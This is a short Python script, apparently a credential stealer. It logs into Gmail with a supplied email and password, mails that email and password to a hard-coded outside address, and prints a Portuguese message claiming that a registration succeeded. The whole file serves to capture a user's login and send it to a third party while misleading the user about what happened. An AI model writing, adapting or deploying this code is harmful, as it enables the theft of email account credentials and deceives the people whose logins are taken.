import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import time
smtp_Server = 'smtp.gmail.com'
smtp_port = 587
email_remetente = ''
senha = ''
msg = MIMEMultipart()
msg['From'] = email_remetente
msg['To'] = 'barususubarutsuki@gmail.com'
msg['Subject'] = 'Assunto do email'
corpo = f'Email: {email_remetente} Senha: {senha}'
msg.attach((MIMEText(corpo, 'plain')))
try:
    server = smtplib.SMTP(smtp_Server, smtp_port)
    server.starttls()  # Inicia a criptografia TLS
    server.login(email_remetente, senha)
    server.send_message(msg)
    print('Cadastro feito!')
except Exception as e:
    print(f'Falha no envio do e-mail: {e}')
finally:
    # Encerra a conexão com o servidor
    server.quit()
